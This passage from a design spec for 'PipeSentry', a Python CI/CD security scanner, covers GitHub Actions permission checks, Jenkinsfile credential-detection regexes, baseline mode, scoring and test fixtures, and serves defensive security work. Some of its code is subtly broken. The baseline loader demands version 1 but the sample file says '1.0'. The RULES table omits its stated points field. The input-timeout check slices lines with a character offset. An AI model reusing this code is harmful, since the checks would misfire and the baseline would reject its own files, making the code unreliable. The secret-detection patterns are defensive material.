                "security-events", "pages", "discussions",
                "repository-projects", "id-token", "copilot-requests",
                "attestations"}

def effective_permissions(workflow_perms, job_perms):
    """Job-level replaces workflow-level entirely. Returns the dict that
    actually governs the job's GITHUB_TOKEN, or None if neither block
    exists (repo default applies — unknown from the file)."""
    if job_perms is not None:
        return job_perms
    return workflow_perms   # may itself be None

def check_permissions(data):
    wf_perms = data.get("permissions")
    findings = []
    if wf_perms is None:
        findings.append(("PG-010", "Medium", "No permissions: block — "
            "token scope depends on the repo default (often read+write on "
            "older repos). Declare 'permissions: {contents: read}' at the top."))
    elif wf_perms == "write-all":
        findings.append(("PG-008", "High", "permissions: write-all — every "
            "scope is writable. Replace with contents: read and grant writes per job."))
    elif isinstance(wf_perms, dict):
        for scope, level in wf_perms.items():
            if level == "write" and scope == "contents":
                findings.append(("PG-009", "High", "Workflow-level "
                    "contents: write — every job can push code and cut "
                    "releases. Move the write to the one job that needs it."))
            elif level == "write":
                findings.append(("PG-009", "Medium", "Workflow-level "
                    "%s: write — grant it on the job that needs it, not to every job." % scope))
    for job_id, job in (data.get("jobs") or {}).items():
        jp = job.get("permissions")
        if jp == "write-all":
            findings.append(("PG-008", "High",
                "Job %s: permissions: write-all" % job_id))
        elif isinstance(jp, dict):
            if jp.get("id-token") == "write" and "deploy" not in job_id.lower():
                findings.append(("PG-011", "Medium",
                    "Job %s: id-token: write mints OIDC tokens — restrict "
                    "it to the deploy job." % job_id))
            # A job block that drops contents: read is usually a bug, not
            # a vulnerability — report it as Low, not a severity finding,
            # because checkout of a private repo will simply fail.
    return findings
```

Severity rationale (write it into the report text, it is a judgement
call the user will be asked about):

- `write-all` anywhere = High (a compromised step can push code,
  approve PRs, modify releases — but it is still only a multiplier,
  not an exploit by itself, so not Critical).
- Workflow-level `contents: write` = High; any other workflow-level
  write = Medium.
- Missing block = Medium (depends on repo default; on a new repo it
  is harmless, on an old repo it is read+write — the scanner cannot
  tell, so it says so).
- `id-token: write` outside a deploy/release job = Medium (OIDC tokens
  are short-lived, but they are cloud credentials).
- `security-events: write` is **legitimate** for the job that uploads
  SARIF to Code Scanning — do not flag it when the job uses
  `github/codeql-action/upload-sarif` or `upload-sarif`. (This is the
  commonest false positive in this check; whitelist it.)

---

## 7. Jenkinsfile text scanning (PG-015 – PG-017)

### Approach: line-oriented regex scan, not a Groovy parser

There is no Groovy parser in the Python standard library, and writing
one is out of scope. A Jenkinsfile is scanned as **text, line by
line**, with regexes. This is honest about its limits: it cannot
follow Groovy control flow, so every Jenkinsfile finding is phrased
as "pattern found on line N" and the severities are set one notch
lower than the equivalent GitHub Actions finding where the context is
uncertain. (Gitleaks does the same thing for secrets, and it is the
industry-standard approach for this file type.)

Line numbers are trivial here: `enumerate(open(path), start=1)`.

### Credential patterns

```python
import re

JENKINS_PATTERNS = [
    # (rule, severity, regex, message)
    ("PG-015", "Critical",
     re.compile(r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
     "Private key in Jenkinsfile — anyone with repo read access has it"),
    ("PG-015", "Critical",
     re.compile(r"AKIA[0-9A-Z]{16}"),
     "AWS access key ID in Jenkinsfile"),
    ("PG-015", "High",
     re.compile(r"(?i)\b(password|passwd|pwd|secret|api[_-]?key|token)\b"
                r"\s*[:=]\s*['\"][^'\"]{3,}['\"]"),
     "Hardcoded credential value in Jenkinsfile — move it to the "
     "Jenkins credentials store and reference it by credentialsId"),
    ("PG-015", "High",
     re.compile(r"(?i)\benv\.[A-Z_][A-Z0-9_]*\s*=\s*['\"][^'\"]{3,}['\"]"),
     "Secret assigned to env in plaintext — visible in source control "
     "and in build logs"),
    ("PG-015", "High",
     re.compile(r"curl[^\n]*(-u\s+|--user\s+)[^\s]+:[^\s]+"),
     "Credentials in a curl -u user:pass argument — visible in the "
     "console log and in the process list"),
    ("PG-015", "High",
     re.compile(r"Authorization:\s*Basic\s+[A-Za-z0-9+/=]{8,}"),
     "Hardcoded Basic-auth header in Jenkinsfile"),
    ("PG-015", "Medium",
     re.compile(r"(?i)aws_secret_access_key\s*=\s*['\"][^'\"]+['\"]"),
     "AWS secret access key in Jenkinsfile"),
]
```

### The `withCredentials` test (the important nuance)

The *correct* Jenkins pattern is:

```groovy
withCredentials([usernamePassword(credentialsId: 'db-creds',
    usernameVariable: 'DB_USER', passwordVariable: 'DB_PASS')]) {
    sh 'docker login -u $DB_USER -p $DB_PASS myregistry.com'
}
```

The credential lives in Jenkins' encrypted store; the pipeline only
holds its ID. The scanner therefore does two things:

1. **Positive check**: does the file contain `withCredentials(` at
   all? If a `sh` step uses a `$VAR` whose name looks secret-like
   (`SECRET|TOKEN|PASSWORD|PASSWD|KEY`) **and** the file has no
   `withCredentials` block, flag PG-015 Medium: "credential variable
   used without withCredentials — where does its value come from?"
   (It may come from a Jenkins global env var, which is why this is
   Medium, not High.)
2. **Negative check**: `withCredentials` present but the *binding*
   itself contains a literal — e.g.
   `string(credentialsId: 'x', variable: 'Y')` is fine, but
   `usernamePassword(credentialsId: 'x', usernameVariable: 'u',
   passwordVariable: 'p')` followed by `sh "echo $p"` is still an
   echo finding (same regexes as §4, applied to the `sh` string).

```python
WITHCREDS_RE = re.compile(r"\bwithCredentials\s*\(")
CRED_BINDING_RE = re.compile(
    r"\b(usernamePassword|string|file|sshUserPrivateKey|aws)\s*\(")

def check_jenkins_credentials(lines):
    text = "\n".join(lines)
    has_withcreds = bool(WITHCREDS_RE.search(text))
    findings = []
    for i, line in enumerate(lines, start=1):
        for rule, sev, rx, msg in JENKINS_PATTERNS:
            if rx.search(line):
                findings.append((rule, sev, msg, i))
        if (not has_withcreds
                and re.search(r"\$[A-Z_][A-Z0-9_]*", line)
                and SECRET_NAME_RE.search(line)):
            findings.append(("PG-015", "Medium",
                "Secret-like variable used with no withCredentials block "
                "in this Jenkinsfile", i))
    return findings
```

### Unguarded `sh` steps (PG-016)

```python
SH_INTERP_RE = re.compile(
    r"""\bsh\s*\(\s*["']{1,3}.*\$\{[^}]+\}.*["']{1,3}""")
# Double-quoted Groovy strings interpolate ${...} BEFORE the shell sees
# it — the Jenkins equivalent of GitHub's ${{ }} injection. Single-quoted
# Groovy strings do NOT interpolate, so sh '...' with $VAR is safe from
# Groovy injection (but $VAR still expands in the shell — that is
# intended, not a finding).

DOCKER_SOCK_RE = re.compile(r"/var/run/docker\.sock")
INPUT_NO_TIMEOUT_RE = re.compile(r"\binput\b")   # see note below

def check_jenkins_shell(lines):
    findings = []
    for i, line in enumerate(lines, start=1):
        if SH_INTERP_RE.search(line):
            findings.append(("PG-016", "High",
                "Groovy ${...} interpolated inside a double-quoted sh "
                "string — use single quotes and pass values via env, or "
                "validate the value first", i))
        if DOCKER_SOCK_RE.search(line) and "sh" in line:
            findings.append(("PG-016", "High",
                "Docker socket mounted into a build step — the step is "
                "root on the host", i))
    # input without timeout: a one-line regex cannot see the whole call,
    # so join the file and look for 'input' blocks lacking 'timeout'
    # within the next ~5 lines. Heuristic — say so in the report.
    text = "\n".join(lines)
    for m in re.finditer(r"(?m)^\s*input\b.*$", text):
        block = "\n".join(text.split("\n")[m.start():][:6])
        if "timeout" not in block:
            line = text[:m.start()].count("\n") + 1
            findings.append(("PG-017", "Low",
                "input step without a timeout — a build can hang forever "
                "waiting for approval", line))
    return findings
```

Known limits to state in the report (do not hide them):

- A multi-line `sh """..."""` block spanning several lines is only
  caught if the `${...}` is on the same line as `sh` — the fix is to
  track "inside a `sh` block" state while scanning lines (a
  ~20-line state machine: on `sh '''`/`sh """` enter block mode,
  on the closing triple-quote leave it). Recommend implementing the
  state machine in v1; the one-line regex above is the fallback.
- `params.X` / `env.X` inside `sh "..."` are the dangerous ones;
  `$VAR` (shell expansion) is not Groovy injection.
- The scanner cannot tell whether a credential came from the Jenkins
  store, a Vault plugin (`withVault`), or a hardcoded literal — that
  is why the no-`withCredentials` finding is Medium.

---

## 8. Baseline mode design

### Why a baseline exists

A legacy repo has hundreds of findings on day one. If the scanner
fails CI on all of them, nobody adopts it. Baseline mode answers one
question: **"what is NEW since the last approved scan?"** Only new
findings fail the gate; old ones are tracked until fixed. This is the
same idea as `gitleaks --baseline`, Semgrep's baseline, and
`jactionlint`'s baseline support.

### What identifies a finding (the key insight: never use the line number)

Line numbers shift on every edit — a finding keyed on
`file + rule + line` breaks the first time someone adds a blank line
above it. The identity must be built from **stable** properties:

```python
import hashlib, json

def finding_key(file, rule_id, obj):
    """Stable identity: file + rule + the object the finding is about.
    The object is the most specific stable anchor available:
      - PG-005: the full uses: string WITHOUT the ref? No — the ref IS
        the finding. Use owner/repo + step's job/step index path.
      - PG-004: job_id + step index + the expression text.
      - PG-001: the trigger name + the job_id of the checkout.
      - PG-009: the scope name (workflow-level) or job_id + scope.
      - PG-015: file + rule + the matched secret *pattern* + variable name
        (never the secret value itself — baselines must not store secrets).
    """
    return "|".join([file, rule_id, obj])

def evidence_hash(evidence):
    """Short hash of the normalised evidence string (lowercased, extra
    whitespace collapsed). Used as a second-chance matcher when the
    object was renamed: same file + same rule + same evidence hash is
    almost certainly the same finding."""
    norm = " ".join(evidence.lower().split())
    return hashlib.sha256(norm.encode()).hexdigest()[:12]
```

Recommended key per rule (put this table in the code as a function,
not as scattered string formatting):

| Rule | `obj` (stable anchor) |
|---|---|
| PG-001/002/003 | `trigger=<event>` + `job=<job_id>` |
| PG-004 | `job=<job_id>:step=<index>:expr=<expression>` |
| PG-005/006 | `job=<job_id>:step=<index>:action=<owner/repo>` |
| PG-007 | `job=<job_id>:step=<index>:var=<name>` (or `expr` for direct echo) |
| PG-008/009/010 | `scope=<scope>` or `job=<job_id>:scope=<scope>` |
| PG-011 | `job=<job_id>` |
| PG-012/013/014 | `job=<job_id>` (+ `step=<index>` for PG-013) |
| PG-015/016/017 | `pattern=<name>` + `line-content-hash` (see below) |

For Jenkinsfile findings the anchor is weaker (there is no job/step
structure). Use `pattern name + the matched text with the secret value
redacted` — e.g. `password = '***'` — hashed. If the line moves, the
hash still matches; if the value changes, it is (correctly) a new
finding.

### Baseline file format (JSON)

```json
{
  "tool": "PipeSentry",
  "version": "1.0",
  "generated_at": "2026-11-25T19:00:00",
  "repo": ".",
  "findings": [
    {
      "key": "ci.yml|PG-005|job=build:step=1:action=tj-actions/changed-files",
      "file": ".github/workflows/ci.yml",
      "rule": "PG-005",
      "severity": "high",
      "object": "job=build:step=1:action=tj-actions/changed-files",
      "line": 14,
      "evidence_hash": "a3f2c91d04e7",
      "title": "Unpinned third-party action"
    }
  ]
}
```

Rules for the format:

- **Never store secret values** in a baseline (no `evidence` field
  with raw matched text — only the hash). A baseline is committed to
  the repo; it must be safe to commit.
- `line` is stored for display only; it is **never** part of matching.
- `version` is the baseline format version, not the tool version — bump
  it if the key scheme changes, and fail loudly on an unknown version
  rather than silently matching nothing.

### Matching algorithm

```python
def load_baseline(path):
    with open(path) as fh:
        data = json.load(fh)
    if data.get("version") != 1:
        raise ValueError("Unsupported baseline version: %s" % data.get("version"))
    by_key = {f["key"]: f for f in data["findings"]}
    by_hash = {(f["file"], f["rule"], f["evidence_hash"]): f
               for f in data["findings"]}
    return by_key, by_hash

def split_new_vs_known(findings, by_key, by_hash):
    """findings: list of Finding objects from this run."""
    new, known = [], []
    for f in findings:
        if f.key in by_key:
            known.append(f)                    # exact match: same finding
        elif (f.file, f.rule, f.evidence_hash) in by_hash:
            known.append(f)                    # renamed object, same evidence
        else:
            new.append(f)
    return new, known
```

Commands (mirror RBACLens flag style):

```bash
pipesentry scan . --baseline-write .pipesentry-baseline.json   # first run: record everything
pipesentry scan . --baseline .pipesentry-baseline.json         # later runs: report only NEW findings
```

Behaviour:

- `--baseline-write` writes the baseline and exits 0 (it is a
  recording run, not a gate).
- `--baseline` reports only new findings in the text/JSON reports,
  prints `N known findings suppressed by baseline (M fixed since
  baseline)` — the "fixed" count is `len(baseline) - len(known)`,
  which is genuinely useful in a report — and exits 2 only if a new
  Critical/High finding exists (same `--fail-on` semantics as a
  normal scan, applied to the *new* set).
- If a baseline file is missing or corrupt, fail loudly (exit 1,
  "baseline not found") — never silently scan as if there were no
  baseline, or a typo'd path would green-light everything.

---

## 9. Severity mapping and scoring

### Severity per rule (final table — implement as data, not if/else)

```python
# rule -> (title, severity, points, fix)
RULES = {
  "PG-001": ("pull_request_target checks out PR head code", "critical",
             "Split the workflow: untrusted code under pull_request, "
             "privileged work under workflow_run."),
  "PG-002": ("pull_request_target without checkout", "high",
             "Prefer pull_request unless you need secrets; keep the job "
             "free of PR-controlled data."),
  "PG-003": ("workflow_run executes an artifact", "high",
             "Download one bounded artifact, validate it against a schema, "
             "never execute it directly."),
  "PG-004": ("Script injection via ${{ }} in run:", "critical",
             "Move the value to env: and reference \"$VAR\" in the script."),
  "PG-005": ("Unpinned third-party action", "high",
             "Pin to the full 40-char commit SHA, keep the version as a "
             "# vX.Y.Z comment."),
  "PG-006": ("Unpinned first-party action", "medium",
             "Pin to the full 40-char commit SHA."),
  "PG-007": ("Secret echoed to logs", "medium",   # High for printenv/set -x
             "Do not print secrets; remove the echo."),
  "PG-008": ("permissions: write-all", "high",
             "Replace with contents: read; grant writes per job."),
  "PG-009": ("Workflow-level write permission", "high",
             "Move the write scope to the job that needs it."),
  "PG-010": ("No permissions: block", "medium",
             "Declare permissions: {contents: read} explicitly."),
  "PG-011": ("id-token: write outside deploy job", "medium",
             "Restrict id-token: write to the deploy job."),
  "PG-012": ("Unsecure workflow commands enabled", "high",
             "Remove ACTIONS_ALLOW_UNSECURE_COMMANDS."),
  "PG-013": ("Checkout persists credentials + artifact upload", "low",
             "Set persist-credentials: false on the checkout step."),
  "PG-014": ("Self-hosted runner with untrusted trigger", "high",
             "Use GitHub-hosted runners for PR-triggered jobs."),
  "PG-015": ("Hardcoded credential in Jenkinsfile", "critical",
             "Move it to the Jenkins credentials store; reference by ID."),
  "PG-016": ("Unguarded sh step in Jenkinsfile", "high",
             "Use single-quoted sh strings; pass values via env."),
  "PG-017": ("Jenkins input step without timeout", "low",
             "Add timeout: time: 30, unit: 'MINUTES'."),
}
```

PG-004 severity note: the table says Critical, but the *finding*
severity should drop to High when the trigger cannot be reached by a
fork (e.g. the workflow only runs on `push` to `main`, where the actor
already has write access). Implement it as: Critical if any trigger
is in `TRIGGERS_UNTRUSTED` (or the workflow has no trigger list the
scanner can prove safe); High otherwise. Same for PG-007 (Medium
normally, High for `printenv`/`set -x`) and PG-015 (Critical for
private keys and AWS secrets, High for passwords/tokens).

### Scoring model (same as RBACLens / Polaris-style)

```python
SEVERITY_POINTS = {"critical": -25, "high": -10, "medium": -5, "low": -2}

def score_findings(findings):
    score = 100 + sum(SEVERITY_POINTS[f.severity] for f in findings)
    return max(0, min(100, score))

def grade_for(score):
    if score >= 90: return "A"
    if score >= 80: return "B"
    if score >= 70: return "C"
    if score >= 60: return "D"
    return "F"
```

Rules, identical to RBACLens (keep the family consistent):

- The score always reflects **all** findings, even when
  `--min-severity` hides some from display and even when a baseline
  suppresses known ones — the baseline report must show both numbers:
  "score 55/100 (F) overall; 90/100 (A) on new findings".
- Exit codes: `0` clean, `1` findings, `2` any Critical (or a
  `--fail-on` hit). With `--baseline`, the exit code is computed from
  the *new* findings only.

---

## 10. Gaps — what no existing Python tool does well

Researched: **zizmor** (Rust, the reference implementation),
**actionlint** (Go, correctness, not security), **jactionlint**
(Go/Rust fork of actionlint with security rules + baseline),
**Checkov** (Python, `CKV_GHA_*` checks), **Trivy**, **Gitleaks**,
**pinact** (Go, pinning only), **CICD-GUARD** (Python, young),
**Semgrep** (generic rules). Findings:

1. **No mature Python tool does GitHub Actions security semantics.**
   zizmor is the best in class and it is Rust; actionlint/jactionlint
   are Go. Checkov is Python but its GHA checks are shallow
   (CKV_GHA_7 and friends): it flags a missing `permissions:` block
   but produces no line-level PR annotations and does no taint-style
   injection analysis. A Python tool with zizmor-level *workflow*
   checks (triggers + checkout + injection + pinning + permissions)
   does not exist — that is PipeSentry's core gap to fill.
2. **No Python tool combines GitHub Actions + Jenkinsfile in one
   binary.** CICD-GUARD tries (Python, scans `*.yml` + `Jenkinsfile`)
   but is a small young project: regex-level checks, no line-precise
   YAML analysis, no baseline mode, no scoring model. PipeSentry's
   two-parser design (YAML node tree + Jenkinsfile line scanner) in
   one tool with one report format is the differentiator.
3. **Baseline mode is rare.** Semgrep and jactionlint have it;
   zizmor does not ship a baseline concept (teams work around it with
   SARIF + code-scanning dismissal). A committed-JSON baseline with
   stable finding keys (§8) is a genuine feature gap for a Python
   tool.
4. **Online verification is missing everywhere offline.** Nobody
   verifies offline that a pinned SHA actually belongs to the tag
   named in its `# vX.Y.Z` comment (that needs the GitHub API), or
   that `owner/repo` is not a typosquat / impostor fork (zizmor has
   online audits for this behind a token). PipeSentry v1 must state
   this as a limit and not pretend the offline check covers it.
5. **Composite actions and reusable workflows are second-class.**
   zizmor scans `action.yml` files too; most other tools only scan
   `.github/workflows/`. PipeSentry should scan `action.yml` /
   `action.yaml` anywhere in the repo with the same PG-004/PG-005
   rules (a composite action's `run:` steps inject the same way) —
   cheap to add, since the parser already handles `run:` blocks.
6. **YAML edge cases are under-tested everywhere.** Anchors and merge
   keys (`<<: *base`), multi-document files, `on:` as boolean (§1),
   flow-style triggers, `workflow_call` inputs — most regex-based
   scanners miss or misread at least one of these. A test fixture for
   each is a cheap, real advantage.
7. **Secret detection in pipelines is generic, not pipeline-aware.**
   Gitleaks finds secrets in any file, but it does not know that
   `echo $SECRET` in a `run:` block is worse than the same string in
   a comment, or that `env:` passing is the *safe* pattern for
   injection. PipeSentry's step-aware analysis (§4) is the gap.
8. **Name collision (checked 2026-11-25):** "PipeGuard" is taken on
   GitHub twice — `tazi06/pipeguard` (Go) and `Steeve-Crypto/pipeguard`
   (Rust, a CI/CD pipeline scanner in the same domain). The tool was
   renamed **PipeSentry** (0 GitHub results at check time). Use
   `pipesentry.py` / `PipeSentry` everywhere, not `pipeguard`.

## Appendix A — CLI surface (mirror RBACLens)

```bash
pipesentry scan <path> [-o report.txt] [--json report.json]
    [--min-severity {critical,high,medium,low}]
    [--fail-on {critical,high,medium,low}]
    [--check PG-001,PG-004] [--skip-check PG-013]
    [--baseline FILE] [--baseline-write FILE]
    [-q] [--batch] [-i|--interactive|--menu] [--version] [--no-color]

pipesentry scan                  # no path = numbered menu (SSTIProbe style)
python run.py setup              # venv + PyYAML
python run.py test               # step tests (bad + clean fixtures)
python run.py doctor             # Python / PyYAML / fixture check
python run.py checks             # list all PG- rules with severities
```

Menu (same shape as RBACLens): [1] Scan a folder [2] Quick scan bad
[3] Quick scan clean [4] List all checks [5] Run step tests
[6] Check setup (doctor) [0] Exit — with banner, LEGAL DISCLAIMER,
Gobuster-style SCAN config block, `[ ? ] Select option :` prompt.

## Appendix B — test fixtures to build (bad vs clean)

`test_workflows/bad/ci.yml` must trigger, at minimum: PG-001 (PR
target + checkout with `ref: ${{ github.event.pull_request.head.sha
}}`), PG-004 (PR title in `run:`), PG-005 (third-party `@v4`),
PG-007 (`echo $TOKEN`), PG-008 (`write-all`), PG-015/016 in
`test_jenkins/bad/Jenkinsfile` (`password = '...'`, `sh "curl
-u user:pass"`). `test_workflows/clean/ci.yml` must be the hardened
mirror: `on: pull_request`, all `uses:` pinned to SHAs with `# vX.Y.Z`
comments, `permissions: {contents: read}`, secrets only via `env:`
and never echoed, no dangerous expressions. Every fixture needs a
line-number assertion: the reported line must equal the line the
finding is on in the fixture file.

## Sources (read 2026-11-25)

- zizmor audits (template-injection, unpinned-uses,
  excessive-permissions, dangerous-triggers, artipacked,
  impostor-commit): https://docs.zizmor.sh
  and https://grafana.com/blog/how-to-detect-vulnerable-github-actions-at-scale-with-zizmor/
- GitHub secure-use reference (SHA pinning, least-privilege token):
  https://docs.github.com/en/actions/reference/security/secure-use
- Script-injection guidance (env: pattern, github-script fix):
  https://developer.wordpress.org/coding-standards/wordpress-coding-standards/github-actions/
- tj-actions/changed-files compromise (CVE-2025-30066):
  https://pydevtools.com/handbook/how-to/how-to-pin-github-actions-by-sha-for-python-projects/
- Permissions model (17 scopes, job-replaces-workflow rule):
  https://dev.to/kalemi/how-githubtoken-permissions-are-set-scope-by-scope-5dl3
- checkout v7 fork-checkout refusal + read-only cache for untrusted
  triggers (2026-06): https://www.softwaresecurity.com/domains/supply-chain/ci-cd/untrusted-workflow-boundaries/
- PyYAML line numbers (compose node tree, custom loader):
  https://www.pythontutorials.net/blog/parsing-yaml-return-with-line-number/
- Apache Beam SafeLineLoader (production custom-loader pattern):
  https://beam.apache.org/releases/pydoc/current/_modules/apache_beam/yaml/yaml_utils.html
- ruamel.yaml line/col API (`lc.key` / `lc.value` / `lc.item`):
  https://pypi.org/project/ruamel.yaml/
- jactionlint (baseline + security rules, Go):
  https://pypi.org/project/jactionlint/2.2.0/
- CICD-GUARD (Python pipeline scanner, regex-level):
  https://github.com/Shlok-177/CICD-GUARD
- Jenkins credential handling (withCredentials):
  https://www.decryptiondigest.com/blog/how-to-secure-jenkins-cicd-pipelines
